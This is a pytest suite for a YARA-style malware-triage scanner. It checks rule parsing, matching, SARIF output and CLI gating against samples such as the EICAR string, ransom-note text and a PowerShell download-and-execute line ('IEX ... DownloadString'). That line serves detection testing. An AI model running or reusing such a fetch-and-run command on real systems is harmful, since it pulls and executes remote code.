"""Deep tests for the YARARUN YARA-subset engine and triage rule pack."""
import json
import os
import sys

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

from yararun import (  # noqa: E402
    TOOL_NAME,
    TOOL_VERSION,
    DEFAULT_RULES,
    file_hashes,
    load_rules,
    parse_rules,
    scan,
    shannon_entropy,
    sniff_filetype,
    to_sarif,
)
from yararun.cli import main  # noqa: E402

DEMO = os.path.join(ROOT, "demos", "02-deep")
DEMOS_ROOT = os.path.join(ROOT, "demos")


# --------------------------------------------------------------------------- #
# Metadata                                                                     #
# --------------------------------------------------------------------------- #
def test_tool_identity():
    assert TOOL_NAME == "yararun"
    assert TOOL_VERSION.count(".") == 2


def test_bundled_pack_parses():
    rules = load_rules()
    assert len(rules) >= 15
    names = {r.name for r in rules}
    assert {"PE_Executable", "Ransom_Note", "UPX_Packed", "Embedded_PowerShell",
            "High_Entropy_Blob", "XOR_Encoded_MZ"} <= names


# --------------------------------------------------------------------------- #
# File-intelligence module                                                     #
# --------------------------------------------------------------------------- #
def test_entropy_bounds():
    assert shannon_entropy(b"") == 0.0
    assert shannon_entropy(b"AAAA") == 0.0          # zero entropy
    # all 256 byte values once -> maximal entropy (8 bits/byte)
    assert abs(shannon_entropy(bytes(range(256))) - 8.0) < 1e-6


def test_filetype_sniff():
    assert sniff_filetype(b"MZ\x90\x00rest") == "pe"
    assert sniff_filetype(b"\x7fELF....") == "elf"
    assert sniff_filetype(b"%PDF-1.7") == "pdf"
    assert sniff_filetype(b"hello world this is plain text\n") == "text"


def test_hashes_known_vector():
    h = file_hashes(b"abc")
    assert h["md5"] == "900150983cd24fb0d6963f7d28e17f72"
    assert h["sha256"] == (
        "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad")


# --------------------------------------------------------------------------- #
# String kinds                                                                 #
# --------------------------------------------------------------------------- #
def test_text_string_nocase_and_fullword():
    src = '''
    rule T {
        strings:
            $a = "Malware" nocase
            $b = "IEX" fullword
        condition:
            $a and $b
    }'''
    r = parse_rules(src)[0]
    assert scan(b"this is malware; IEX runs", [r]).matches
    assert not scan(b"this is malware; IEXtra", [r]).matches  # $b not fullword


def test_hex_string_wildcards_and_jumps():
    src = '''
    rule H {
        strings:
            $h = { 4D 5A ?? ?? [4-8] 50 45 00 00 }
        condition:
            $h
    }'''
    r = parse_rules(src)[0]
    good = b"MZ\x90\x00" + b"\x00" * 6 + b"PE\x00\x00"
    assert scan(good, [r]).matches
    too_short = b"MZ\x90\x00" + b"\x00" * 2 + b"PE\x00\x00"  # gap < 4
    assert not scan(too_short, [r]).matches


def test_regex_string_and_count():
    src = r'''
    rule R {
        strings:
            $u = /https?:\/\/[a-z]+/ nocase
        condition:
            #u >= 2
    }'''
    r = parse_rules(src)[0]
    assert not scan(b"one http://aaa here", [r]).matches
    assert scan(b"http://aaa and HTTPS://bbb", [r]).matches


def test_xor_modifier_finds_encoded_string():
    """The `xor` modifier brute-forces single-byte keys (real YARA behaviour)."""
    src = '''
    rule X {
        strings:
            $s = "secret-c2-domain" xor(0x01-0xff)
        condition:
            $s
    }'''
    r = parse_rules(src)[0]
    key = 0x42
    encoded = bytes(b ^ key for b in b"secret-c2-domain")
    assert scan(b"junk" + encoded + b"junk", [r]).matches
    # plaintext is excluded because the range starts at 0x01 (no identity key)
    assert not scan(b"plain secret-c2-domain here", [r]).matches


# --------------------------------------------------------------------------- #
# Condition operators                                                          #
# --------------------------------------------------------------------------- #
def test_at_and_filesize_conditions():
    src = '''
    rule A {
        strings:
            $mz = { 4D 5A }
        condition:
            $mz at 0 and filesize < 1KB
    }'''
    r = parse_rules(src)[0]
    assert scan(b"MZ payload", [r]).matches
    assert not scan(b"xxMZ payload", [r]).matches  # not at offset 0


def test_uint_integer_functions():
    src = '''
    rule U {
        condition:
            uint16(0) == 0x5A4D and uint32(0) == 0x00905A4D
    }'''
    r = parse_rules(src)[0]
    # little-endian: bytes 4D 5A 90 00 -> uint16=0x5A4D, uint32=0x00905A4D
    assert scan(b"MZ\x90\x00rest", [r]).matches
    assert not scan(b"PKzip", [r]).matches


def test_entropy_and_filetype_vars():
    src = '''
    rule E {
        condition:
            entropy >= 7.5 and filetype == "data"
    }'''
    r = parse_rules(src)[0]
    high = bytes(range(256)) * 8           # high entropy, not a known magic
    assert scan(high, [r]).matches
    assert not scan(b"AAAA" * 100, [r]).matches  # low entropy


def test_match_length_and_offset_index():
    src = '''
    rule L {
        strings:
            $a = "abcd"
        condition:
            !a == 4 and @a[1] == 5
    }'''
    r = parse_rules(src)[0]
    assert scan(b"00000abcd----abcd", [r]).matches   # first match at offset 5
    assert not scan(b"abcd at zero", [r]).matches      # @a[1] != 5


def test_n_of_set_and_them():
    src = '''
    rule N {
        strings:
            $s1 = "alpha"
            $s2 = "bravo"
            $s3 = "charlie"
        condition:
            2 of them
    }'''
    r = parse_rules(src)[0]
    assert not scan(b"only alpha", [r]).matches
    assert scan(b"alpha and bravo", [r]).matches
    assert scan(b"alpha bravo charlie", [r]).matches


def test_wildcard_set_prefix():
    src = '''
    rule W {
        strings:
            $a1 = "foo"
            $a2 = "bar"
            $b1 = "baz"
        condition:
            any of ($a*)
    }'''
    r = parse_rules(src)[0]
    assert scan(b"contains foo", [r]).matches
    assert not scan(b"contains baz only", [r]).matches


# --------------------------------------------------------------------------- #
# Real triage detections against the bundled pack                              #
# --------------------------------------------------------------------------- #
def test_eicar_detection():
    eicar = (rb"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-"
             rb"ANTIVIRUS-TEST-FILE!$H+H*")
    res = scan(eicar, load_rules())
    assert any(m.rule == "EICAR_Test_File" for m in res.matches)


def test_ransom_note_detection_critical():
    note = (b"All your files have been encrypted! To decrypt them you must "
            b"send 0.5 bitcoin to our BTC wallet. Pay the ransom now.")
    res = scan(note, load_rules())
    rn = [m for m in res.matches if m.rule == "Ransom_Note"]
    assert rn and rn[0].severity == "critical"
    assert res.max_severity == "critical"


def test_powershell_dropper_detection():
    blob = (b"powershell -enc IEX (New-Object Net.WebClient)."
            b"DownloadString('http://x'); FromBase64String")
    res = scan(blob, load_rules())
    assert any(m.rule == "Embedded_PowerShell" for m in res.matches)


# --------------------------------------------------------------------------- #
# Demo fixtures + CLI                                                          #
# --------------------------------------------------------------------------- #
def test_demo_sample_scans_dirty():
    sample = os.path.join(DEMO, "suspicious_sample.bin")
    ruls = os.path.join(DEMO, "triage.yar")
    assert os.path.exists(sample) and os.path.exists(ruls)
    with open(sample, "rb") as fh:
        data = fh.read()
    with open(ruls, "r", encoding="utf-8") as fh:
        rules = parse_rules(fh.read())
    res = scan(data, rules, target=sample)
    hit = {m.rule for m in res.matches}
    assert "Dropper_PowerShell_Chain" in hit
    assert "Embedded_PE_via_HexHeader" in hit
    assert "C2_Beacon_URL" in hit
    assert "XOR_Hidden_Executable" in hit          # new: xor modifier
    assert "Packed_Payload_Entropy" in hit          # new: entropy var
    assert res.max_severity == "critical"
    assert res.entropy >= 7.5
    assert res.filetype == "pe"


def test_cli_scan_returns_nonzero_on_findings(capsys):
    sample = os.path.join(DEMO, "suspicious_sample.bin")
    ruls = os.path.join(DEMO, "triage.yar")
    rc = main(["--format", "json", "scan", "-r", ruls, sample])
    out = capsys.readouterr().out
    payload = json.loads(out)
    assert rc == 1                      # actionable findings -> non-zero exit
    assert payload["match_count"] >= 5
    assert payload["max_severity"] == "critical"
    assert "sha256" in payload["hashes"]
    assert payload["entropy"] >= 7.5


def test_cli_info_subcommand(capsys):
    sample = os.path.join(DEMO, "suspicious_sample.bin")
    rc = main(["--format", "json", "info", sample])
    out = capsys.readouterr().out
    data = json.loads(out)
    assert rc == 0
    assert data["filetype"] == "pe"
    assert data["entropy"] >= 7.5
    assert len(data["hashes"]["sha256"]) == 64


def test_cli_scan_clean_returns_zero(tmp_path, capsys):
    clean = tmp_path / "clean.txt"
    clean.write_text("just some perfectly ordinary text\n")
    rc = main(["scan", str(clean)])
    capsys.readouterr()
    assert rc == 0


def test_cli_compile_and_rules(capsys):
    ruls = os.path.join(DEMO, "triage.yar")
    rc = main(["compile", ruls])
    assert rc == 0
    capsys.readouterr()
    rc = main(["--format", "json", "rules"])
    out = capsys.readouterr().out
    assert rc == 0
    data = json.loads(out)
    assert any(r["name"] == "Cryptominer_Config" for r in data)


def test_version(capsys):
    with pytest.raises(SystemExit) as e:
        main(["--version"])
    assert e.value.code == 0
    assert TOOL_VERSION in capsys.readouterr().out


# --------------------------------------------------------------------------- #
# Fixture: make the 02-deep binary self-healing                                #
# --------------------------------------------------------------------------- #
@pytest.fixture(autouse=True, scope="session")
def _ensure_demo_sample():
    """Regenerate the 02-deep artifact if a fresh checkout / AV stripped it."""
    sample = os.path.join(DEMO, "suspicious_sample.bin")
    if not os.path.exists(sample):
        import runpy
        runpy.run_path(os.path.join(DEMO, "build_sample.py"), run_name="__main__")
    yield


# --------------------------------------------------------------------------- #
# SARIF 2.1.0 export                                                           #
# --------------------------------------------------------------------------- #
def test_sarif_export_structure():
    blob = (b"powershell -enc IEX DownloadString FromBase64String "
            b"http://a http://b http://c")
    res = scan(blob, load_rules(), target="suspect.txt")
    log = to_sarif([res])
    assert log["version"] == "2.1.0"
    run = log["runs"][0]
    assert run["tool"]["driver"]["name"] == "yararun"
    assert run["tool"]["driver"]["version"] == TOOL_VERSION
    # one descriptor per distinct matched rule, indices line up
    rules = run["tool"]["driver"]["rules"]
    ids = [r["id"] for r in rules]
    assert len(set(ids)) == len(ids)
    for result in run["results"]:
        assert result["ruleId"] == rules[result["ruleIndex"]]["id"]
        assert result["level"] in ("error", "warning", "note")
        loc = result["locations"][0]["physicalLocation"]
        assert loc["artifactLocation"]["uri"] == "suspect.txt"


def test_sarif_levels_map_severity():
    crit = scan(b"All your files have been encrypted! decrypt bitcoin BTC wallet",
                load_rules())
    log = to_sarif([crit])
    ransom = [r for r in log["runs"][0]["results"] if r["ruleId"] == "Ransom_Note"]
    assert ransom and ransom[0]["level"] == "error"
    desc = next(d for d in log["runs"][0]["tool"]["driver"]["rules"]
                if d["id"] == "Ransom_Note")
    assert desc["properties"]["security-severity"] == "9.5"


def test_cli_sarif_format(capsys):
    sample = os.path.join(DEMO, "suspicious_sample.bin")
    ruls = os.path.join(DEMO, "triage.yar")
    rc = main(["--format", "sarif", "scan", "-r", ruls, sample])
    out = capsys.readouterr().out
    doc = json.loads(out)
    assert rc == 1
    assert doc["version"] == "2.1.0"
    assert len(doc["runs"][0]["results"]) >= 5


# --------------------------------------------------------------------------- #
# --fail-on severity gate                                                      #
# --------------------------------------------------------------------------- #
def test_fail_on_threshold(tmp_path, capsys):
    # 3+ hardcoded URLs -> Suspicious_URL at severity 'medium'.
    # Default gate trips; --fail-on high should not.
    f = tmp_path / "urls.txt"
    f.write_text("http://aaa.test http://bbb.test http://ccc.test http://ddd.test")
    assert main(["scan", str(f)]) == 1                       # default (any)
    capsys.readouterr()
    assert main(["scan", "--fail-on", "high", str(f)]) == 0  # medium < high
    capsys.readouterr()


def test_fail_on_critical_only(tmp_path, capsys):
    # A 'high' finding should pass a --fail-on critical gate.
    high = tmp_path / "ps.txt"
    high.write_text("powershell -enc IEX DownloadString FromBase64String")
    assert main(["scan", "--fail-on", "critical", str(high)]) == 0
    capsys.readouterr()
    assert main(["scan", "--fail-on", "high", str(high)]) == 1
    capsys.readouterr()


# --------------------------------------------------------------------------- #
# Every shipped demo must actually fire its documented detection               #
# --------------------------------------------------------------------------- #
# (path-relative-to-demos, expected_rule, optional custom ruleset)
DEMO_CASES = [
    ("04-cryptominer/config.json", "Cryptominer_Config", None),
    ("05-ransom-note/README_RECOVER_FILES.txt", "Ransom_Note", None),
    ("06-reverse-shell/cron_backdoor.sh", "Shell_Reverse_Connect", None),
    ("07-office-macro/invoice_macro.vba", "VBScript_Macro", None),
    ("09-credential-stealer/stealer_strings.txt", "Credential_Theft", None),
    ("10-custom-sarif/settings.py", "AWS_Access_Key_Id",
     "10-custom-sarif/secrets.yar"),
]


@pytest.mark.parametrize("relpath,expected_rule,ruleset", DEMO_CASES)
def test_demo_fires_expected_rule(relpath, expected_rule, ruleset):
    target = os.path.join(DEMOS_ROOT, relpath)
    assert os.path.exists(target), f"missing demo input: {relpath}"
    with open(target, "rb") as fh:
        data = fh.read()
    if ruleset:
        with open(os.path.join(DEMOS_ROOT, ruleset), encoding="utf-8") as fh:
            rules = parse_rules(fh.read())
    else:
        rules = load_rules()
    hits = {m.rule for m in scan(data, rules, target=target).matches}
    assert expected_rule in hits, f"{relpath} did not fire {expected_rule}: {hits}"


def test_eicar_demo_builder_produces_match(tmp_path):
    """The 08 demo builder yields a file the EICAR rule detects (in tmp)."""
    import runpy
    import importlib
    # build directly into a tmp path to avoid on-access AV on the repo tree
    builder = os.path.join(DEMOS_ROOT, "08-eicar-ci-gate", "build_eicar.py")
    mod = runpy.run_path(builder)
    payload = (mod["_A"] + mod["_B"]).encode("ascii")
    res = scan(payload, load_rules())
    assert any(m.rule == "EICAR_Test_File" for m in res.matches)
    importlib.invalidate_caches()
